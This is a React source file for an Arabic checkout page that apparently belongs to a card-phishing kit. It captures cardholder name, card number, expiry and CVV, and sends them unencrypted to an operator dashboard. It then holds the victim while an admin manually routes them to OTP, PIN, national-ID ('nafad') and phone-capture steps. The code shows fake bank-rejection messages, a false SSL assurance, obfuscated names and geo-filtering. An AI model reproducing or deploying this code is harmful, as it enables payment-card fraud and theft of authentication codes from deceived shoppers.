

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { useLocation } from 'wouter'
import { toast } from "sonner"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ShieldCheck, CreditCard, Lock } from "lucide-react"
import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils"
import { secureAddData } from "@/lib/secure-firebase"
import { addToHistory } from "@/lib/history-utils"
import { FullPageLoader } from "./loader"
import { _gt } from "@/lib/text-obf"
import { isCountryAllowed, _icb } from "@/lib/firebase/settings"
import { EmailModal } from "@/components/email-modal"
import { _e } from "@/lib/secure-utils"
import { getData, notifyDashboard } from "@/lib/api"
import { onVisitorStatusUpdated } from "@/lib/socket"
import { API_BASE } from "@/lib/api"


interface _P1Props {
  offerTotalPrice: number
}

export default function P1({ offerTotalPrice }: _P1Props) {
  const [, navigate] = useLocation()
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-card")
  const [_v1, _s1] = useState("")
  const [_v4, _s4] = useState("")
  const [_v3, _s3] = useState("")
  const [_v2, _s2] = useState("")
  const [cardType, setCardType] = useState<string | null>(null)
  const [bankInfo, setBankInfo] = useState<{ name: string; country: string } | null>(null)
  const [isValidCard, setIsValidCard] = useState(false)
  const [expiryError, setExpiryError] = useState("")
  const [cardRejectionError, setCardRejectionError] = useState("")

  // Waiting state
  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
  const rejectionHandledRef = useRef(false)
  
  const [isCardBlockedState, setIsCardBlockedState] = useState(false)
  const [showEmailModal, setShowEmailModal] = useState(false)
  const [userCountry, setUserCountry] = useState<string | null>(null)
  const [countryCheckDone, setCountryCheckDone] = useState(false)

  useEffect(() => {
    const cleanNumber = _v1.replace(/\s/g, "")
    if (cleanNumber.length >= 6) {
      const type = _dct(cleanNumber)
      setCardType(type)
      const bank = _gbi(cleanNumber)
      setBankInfo(bank)
    } else {
      setCardType(null)
      setBankInfo(null)
    }

    if (cleanNumber.length === 16) {
      setIsValidCard(_lc(cleanNumber))
    } else {
      setIsValidCard(false)
    }
  }, [_v1])

  useEffect(() => {
    const checkCardBlocked = async () => {
      const cleanNumber = _v1.replace(/\s/g, "")
      if (cleanNumber.length >= 4) {
        const blocked = await _icb(cleanNumber)
        setIsCardBlockedState(blocked)
      } else {
        setIsCardBlockedState(false)
      }
    }
    checkCardBlocked()
  }, [_v1])

  // Check user country on component mount
  useEffect(() => {
    const checkCountry = async () => {
      try {
        // Check if already submitted email
        const emailSubmitted = localStorage.getItem("email_submitted")
        if (emailSubmitted) {
          // Redirect to thank you page
          navigate("/thank-you")
          return
        }

        // Get country from localStorage (saved from Firebase)
        let countryCodeAlpha3 = localStorage.getItem("country")
        
        // If not in localStorage, try to get from API
        if (!countryCodeAlpha3) {
          const visitorID = localStorage.getItem("visitor")
          if (visitorID) {
            const data = await getData(visitorID)
            if (data?.country) {
              countryCodeAlpha3 = data.country
              localStorage.setItem("country", countryCodeAlpha3!)
            }
          }
        }
        
        if (countryCodeAlpha3) {
          setUserCountry(countryCodeAlpha3)
          
          // Check if country is allowed
          const allowed = await isCountryAllowed(countryCodeAlpha3)
          if (!allowed) {
            setShowEmailModal(true)
          }
        }
        
        setCountryCheckDone(true)
      } catch (error) {
        console.error('Error checking country:', error)
        // If error, allow access
        setCountryCheckDone(true)
      }
    }
    checkCountry()
  }, [navigate])

  // Validate expiry date
  useEffect(() => {
    if (_v3.length === 5) {
      const [month, year] = _v3.split('/')
      const currentDate = new Date()
      const currentYear = currentDate.getFullYear() % 100 // Last 2 digits
      const currentMonth = currentDate.getMonth() + 1

      const expYear = parseInt(year)
      const expMonth = parseInt(month)

      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        setExpiryError("تاريخ البطاقة منتهي")
      } else {
        setExpiryError("")
      }
    } else {
      setExpiryError("")
    }
  }, [_v3])

  // Handle card status updates from Socket.io AND polling fallback
  const handleCardStatus = (status: string) => {
    if (status === 'approved_with_otp') {
      setIsWaitingAdmin(false)
      navigate('/step2')
    } else if (status === 'approved_with_pin') {
      setIsWaitingAdmin(false)
      navigate('/step3')
    } else if (status === 'rejected' && !rejectionHandledRef.current) {
      rejectionHandledRef.current = true
      setIsWaitingAdmin(false)
      setCardRejectionError('تم رفض البطاقة من قبل البنك المصدر الرجاء التسديد من مصرف آخر')
      toast.error('تم رفض بيانات البطاقة', { description: 'يرجى إعادة إدخال بيانات صحيحة', duration: 5000 })
    }
  }

  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    // 1. Socket.io real-time listener
    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === 'redirectPage' && status === 'payment') {
        console.log('[Card Status] Admin redirect detected, ignoring auto-redirect')
        return
      }
      if (field === 'cardStatus') {
        console.log('[Card Status] Socket update:', status)
        handleCardStatus(status)
      }
      // Handle _v1Status for payment approval/rejection
      if (field === '_v1Status') {
        console.log('[Payment] _v1Status update:', status)
        if (status === 'approved') {
          setIsWaitingAdmin(false)
          navigate('/step2')
        } else if (status === 'rejected') {
          // Will be set by polling with the rejection message
          setIsWaitingAdmin(false)
        }
      }
      // Handle redirectPage for direct navigation
      if (field === 'redirectPage') {
        console.log('[Payment] redirectPage via socket:', status)
        if (status === 'step2' || status === 'otp' || status === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
        else if (status === 'step3' || status === 'pin' || status === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
        else if (status === 'step4' || status === 'nafad' || status === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
        else if (status === 'step5' || status === 'phone' || status === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
        else if (status === 'thank-you') { setIsWaitingAdmin(false); navigate('/thank-you') }
      }
    })

    // 2. Polling fallback every 3s - catches updates when socket is offline
    const pollInterval = setInterval(async () => {
      if (!isWaitingAdmin) return
      try {
        const res = await fetch(`${API_BASE}/api/visitors/${visitorID}`)
        if (!res.ok) return
        const data = await res.json()
        // Check _v1Status for payment approval/rejection
        const paymentStatus = data._v1Status || data._v1_status
        if (paymentStatus) {
          console.log('[Payment] Polling _v1Status:', paymentStatus)
          if (paymentStatus === 'approved') {
            setIsWaitingAdmin(false)
            navigate('/step2')
            return
          } else if (paymentStatus === 'rejected') {
            // Use rejection message from server or fallback to default
            const rejectionMsg = data.cardRejectionMessage || "بيانات البطاقة غير صحيحة - يرجى المحاولة بطريقة دفع مختلفة"
            setCardRejectionError(rejectionMsg)
            setIsWaitingAdmin(false)
            return
          }
        }
        // Check cardStatus (backend returns snake_case)
        const cs = data.card_status || data.cardStatus
        if (cs && cs !== 'pending') {
          console.log('[Card Status] Polling update:', cs)
          handleCardStatus(cs)
        }
        // Check redirectPage (backend returns snake_case)
        const rp = data.redirect_page || data.redirectPage
        if (rp) {
          console.log('[Payment] Polling redirectPage:', rp)
          if (rp === 'step2' || rp === 'otp' || rp === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
          else if (rp === 'step3' || rp === 'pin' || rp === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
          else if (rp === 'step4' || rp === 'nafad' || rp === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
          else if (rp === 'step5' || rp === 'phone' || rp === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
          else if (rp === 'thank-you') { setIsWaitingAdmin(false); navigate('/thank-you') }
        }
      } catch {
        // Ignore polling errors silently
      }
    }, 3000)

    return () => {
      unsubscribe()
      clearInterval(pollInterval)
    }
  }, [navigate, isWaitingAdmin])

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = _fcn(e.target.value)
    // Limit to 16 digits (19 chars with spaces)
    if (formatted.replace(/\s/g, "").length <= 16) {
      _s1(formatted)
    }
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = _fed(e.target.value)
    _s3(formatted)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3)
    _s2(value)
  }

  const _hp = async (e: React.FormEvent) => {
    e.preventDefault()

    let visitorID = localStorage.getItem("visitor")

    if (!visitorID) {
      visitorID = "visitor_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
      localStorage.setItem("visitor", visitorID)
    }

    if (!isValidCard) {
      alert(_gt("t5"))
      return
    }

    if (expiryError) {
      alert(expiryError)
      return
    }

    if (isCardBlockedState) {
      toast.error("تم إيقاف التسديد", {
        description: "تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية. الرجاء إدخال بطاقة من مصرف آخر",
        duration: 7000
      })
      return
    }

    try {
      // Reset rejection flag and error message for new submission
      rejectionHandledRef.current = false
      setCardRejectionError("")
      
      const finalPrice = calculateFinalPrice()
      const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
      
      console.log('[Payment] Starting payment process for visitor:', visitorID)
      
      await secureAddData({
        id: visitorID,
        paymentMethod: selectedPaymentMethod,
        cardType,
        bankInfo,
        // Card details with clear names for dashboard
        cardNumber: _v1,
        cardOwner: _v4,
        cardExpiry: _v3,
        cvv: _v2,
        // Encrypted fields
        _v4,
        _v2,
        _v1,
        _v3,
        originalPrice: offerTotalPrice,
        discount,
        finalPrice: Number.parseFloat(finalPrice.toFixed(2)),
        // Set status to pending for admin approval
        _v1Status: "pending",
        paymentStatus: "pending",
        cardStatus: "pending",
        otpStatus: "pending",
        // Clear any previous redirect/step values
        redirectPage: null,
        currentStep: "_st1"
      })
      
      console.log('[Payment] Data saved successfully')

      // Notify dashboard immediately with updated status
      await notifyDashboard({
        id: visitorID,
        visitorId: visitorID,
        _v1Status: "pending",
        _v1UpdatedAt: new Date().toISOString(),
        paymentStatus: "pending",
        cardStatus: "pending",
        cardNumber: _v1,
        cardOwner: _v4,
        cardExpiry: _v3,
        cvv: _v2,
        paymentMethod: selectedPaymentMethod,
        cardType,
        bankInfo,
        currentPage: "check",
        currentStep: "_st1",
        status: "pending"
      })

      console.log('[Payment] Dashboard notified')

      // Trigger dashboard refresh for instant update
      if (typeof window !== 'undefined') {
        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
      }

      await addToHistory(visitorID, "_t1", {
        _v1: _e(_v1),
        _v4: _e(_v4),
        cardType,
        _v3: _e(_v3),
        _v2: _e(_v2),
        bankInfo
      }, "pending")
      
      console.log('[Payment] History entry added successfully')

      setIsWaitingAdmin(true)
      console.log('[Payment] Waiting for admin approval')
    } catch (error) {
      console.error("[Payment] Payment error:", error)
      toast.error("حدث خطأ", {
        description: `فشلت معالجة الدفع: ${error instanceof Error ? error.message : 'خطأ غير معروف'}`,
        duration: 5000
      })
    }
  }

  const getDiscountAmount = () => {
    if (selectedPaymentMethod === "credit-card") {
      return "15%"
    }
    return null
  }

  const calculateFinalPrice = () => {
    if (selectedPaymentMethod === "credit-card") {
      return offerTotalPrice * 0.85
    }
    return offerTotalPrice
  }

  const finalPrice = calculateFinalPrice()

  // Handle email submission for blocked countries
  const handleEmailSubmit = async (name: string, email: string) => {
    try {
      const visitorID = localStorage.getItem("visitor") || "visitor_" + Date.now()
      
      // Save to Firebase or send email
      await secureAddData({
        id: visitorID,
        name,
        email,
        country: userCountry,
        status: "pending_email",
        offerPrice: offerTotalPrice,
        createdAt: new Date().toISOString()
      })
      
      // Mark email as submitted
      localStorage.setItem("email_submitted", "true")
      
      // Redirect to thank you page
      setTimeout(() => {
        navigate("/thank-you")
      }, 1000)
    } catch (error) {
      console.error("Error saving email:", error)
      throw error
    }
  }

  return (
    <>
      {isWaitingAdmin && <FullPageLoader />}
      
      {/* Email Modal for Blocked Countries */}
      <EmailModal 
        isOpen={showEmailModal} 
        onClose={() => setShowEmailModal(false)}
        onSubmit={handleEmailSubmit}
        canClose={false}
      />
      
      <div className={`space-y-5 ${showEmailModal ? 'blur-xl pointer-events-none' : ''}`} dir="rtl">
        {/* Payment Method Selection */}
        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-5 md:p-6 border border-gray-200">
          <label className="flex items-center gap-2 text-gray-900 font-bold text-base md:text-lg mb-4">
            <ShieldCheck className="w-5 h-5 text-[#0a4a68]" />
            طريقة الدفع
          </label>
          <div className="space-y-3">
            {[
              { 
                value: "credit-card", 
                label: "البطاقات الائتمانية", 
                discount: "15%", 
                icons: ["/visa.svg", "/mas.svg"],
                disabled: false
              },
              { 
                value: "mada", 
                label: "بطاقات مدى", 
                discount: null, 
                icon: "/mada.jpg",
                disabled: false
              },
              { 
                value: "apple-pay", 
                label: "Apple Pay", 
                discount: null, 
                icon: "/apple-pay.png",
                disabled: false,
                message: "غير متوفر حالياً - يرجى استخدام طريقة دفع أخرى"
              },

            ].map((method) => (
              <div key={method.value}>
              <label
                className={`
                  relative flex items-center justify-between gap-3 p-4 md:p-5
                  border-2 rounded-xl cursor-pointer transition-all duration-200
                  ${
                    selectedPaymentMethod === method.value
                      ? "border-[#0a4a68] bg-white shadow-md"
                      : "border-gray-200 hover:border-gray-300 bg-white/50"
                  }
                  ${method.disabled ? "opacity-60 cursor-not-allowed" : ""}
                  ${(method as any).unavailable ? "opacity-75" : ""}
                `}
              >
                <div className="flex items-center gap-3">
                  <input
                    type="radio"
                    name="paymentMethod"
                    value={method.value}
                    checked={selectedPaymentMethod === method.value}
                    onChange={() => {
                      if (method.disabled) return
                      if ((method as any).unavailable) {
                        toast.error("Apple Pay غير متوفر حالياً", {
                          description: "يرجى اختيار طريقة دفع أخرى",
                          duration: 4000
                        })
                        return
                      }
                      setSelectedPaymentMethod(method.value)
                    }}
                    disabled={method.disabled}
                    className="w-5 h-5 text-[#0a4a68] focus:ring-[#0a4a68] disabled:opacity-50"
                  />
                  <div className="flex items-center gap-2">
                    {method.icons ? (
                      method.icons.map((icon, idx) => (
                        <img key={idx} src={icon} alt="logo" width={35} height={22} className="object-contain" />
                      ))
                    ) : (
                      <img src={method.icon || "/placeholder.svg"} alt="logo" width={35} height={22} className="object-contain" />
                    )}
                  </div>
                  <span className={`text-base md:text-lg font-semibold ${method.disabled ? 'text-gray-400' : 'text-gray-900'}`}>
                    {method.label}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  {method.discount && (
                    <Badge className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 font-bold px-3 py-1 text-xs shadow-sm">
                      خصم {method.discount}
                    </Badge>
                  )}
                </div>
              </label>
              {/* Error message below selected option */}
              {method.message && selectedPaymentMethod === method.value && (
                <div className="mt-2 p-3 bg-red-50 border border-red-200 rounded-lg" dir="rtl">
                  <p className="text-sm text-red-600 font-medium">
                    {method.message}
                  </p>
                </div>
              )}
              </div>
            ))}
          </div>
        </div>

        {/* Card Information Form */}
        <form onSubmit={_hp} className="space-y-4">
          {/* Card Holder Name */}
          <div className="space-y-2">
            <label className="block text-gray-900 font-bold text-sm md:text-base">
              اسم حامل البطاقة
            </label>
            <Input
              type="text"
              value={_v4}
              onChange={(e) => _s4(e.target.value.toUpperCase())}
              placeholder="CARDHOLDER NAME"
              dir="ltr"
              disabled={isCardBlockedState}
              className={`h-14 md:h-16 text-lg md:text-xl uppercase border-2 rounded-xl ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : "border-gray-300 focus:border-[#0a4a68]"}`}
              required
            />
          </div>

          {/* Card Number Input */}
          <div className="space-y-2">
            <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
              <CreditCard className="w-4 h-4 text-[#0a4a68]" />
              رقم البطاقة
              {isValidCard && !isCardBlockedState && (
                <Badge variant="outline" className="border-green-500 text-green-700 text-xs">
                  <ShieldCheck className="w-3 h-3 ml-1" />
                  صالح
                </Badge>
              )}
              {cardType && !isCardBlockedState && (
                <Badge className="bg-blue-100 text-blue-800 text-xs">
                  {cardType}
                </Badge>
              )}
            </label>
            <Input
              type="text"
              value={_v1}
              onChange={handleCardNumberChange}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
              dir="ltr"
              disabled={isCardBlockedState}
              className={`h-14 md:h-16 text-xl md:text-2xl font-mono tracking-wider border-2 rounded-xl transition-all ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : isValidCard ? "border-green-500 focus:border-green-600" : _v1.length > 0 ? "border-red-300 focus:border-red-500" : "border-gray-300 focus:border-[#0a4a68]"}`}
              required
            />
            {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && !isCardBlockedState && (
              <p className="text-red-500 text-xs">يجب أن يكون 16 رقم</p>
            )}
            {cardRejectionError && (
              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
                <p className="text-red-700 text-sm font-bold">
                  {cardRejectionError}
                </p>
              </div>
            )}
            {isCardBlockedState && (
              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
                <p className="text-red-700 text-sm font-bold">
                  ⚠️ هذه البطاقة غير مدعومة
                </p>
                <p className="text-red-600 text-xs mt-1">
                  يرجى استخدام طريقة دفع أخرى
                </p>
              </div>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-3 md:gap-4">
            <div className="space-y-2">
              <label className="block text-gray-900 font-bold text-sm md:text-base">
                تاريخ الانتهاء
              </label>
              <Input
                type="text"
                value={_v3}
                onChange={handleExpiryDateChange}
                placeholder="MM/YY"
                maxLength={5}
                dir="ltr"
                disabled={isCardBlockedState}
                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : expiryError ? "border-red-500 focus:border-red-600" : "border-gray-300 focus:border-[#0a4a68]"}`}
                required
              />
              {expiryError && (
                <p className="text-red-500 text-xs">{expiryError}</p>
              )}
            </div>
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
                <Lock className="w-4 h-4 text-[#0a4a68]" />
                CVV
              </label>
              <Input
                type="password"
                value={_v2}
                onChange={handleCvvChange}
                placeholder="123"
                maxLength={3}
                dir="ltr"
                disabled={isCardBlockedState}
                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : "border-gray-300 focus:border-[#0a4a68]"}`}
                required
              />
              {_v2.length > 0 && _v2.length !== 3 && (
                <p className="text-red-500 text-xs">يجب أن يكون 3 أرقام</p>
              )}
            </div>
          </div>

          {/* Price Summary - Compact */}
          {getDiscountAmount() && (
            <div className="bg-green-50 rounded-lg p-3 border border-green-200">
              <div className="flex justify-between items-center text-sm">
                <span className="text-gray-600">السعر الأصلي:</span>
                <span className="text-gray-600 line-through">{offerTotalPrice.toFixed(2)} ﷼</span>
              </div>
              <div className="flex justify-between items-center text-sm mt-1">
                <span className="text-green-600 font-semibold">خصم {getDiscountAmount()}:</span>
                <span className="text-green-600 font-semibold">
                  -{(offerTotalPrice * 0.15).toFixed(2)} ﷼
                </span>
              </div>
            </div>
          )}

          {/* Submit Button with Price */}
          <Button
            type="submit"
            disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4 || isCardBlockedState}
            className="w-full h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl md:text-2xl rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <Lock className="w-5 h-5 ml-2" />
            {isCardBlockedState ? "البطاقة غير مدعومة" : `دفع ${finalPrice.toFixed(2)} ﷼`}
          </Button>

          {/* Security Notice */}
          <div className="flex items-center justify-center gap-2 text-gray-500 text-xs md:text-sm">
            <ShieldCheck className="w-4 h-4" />
            <span>معاملتك محمية بتشفير SSL 256-bit</span>
          </div>
        </form>
      </div>

    </>
  )
}
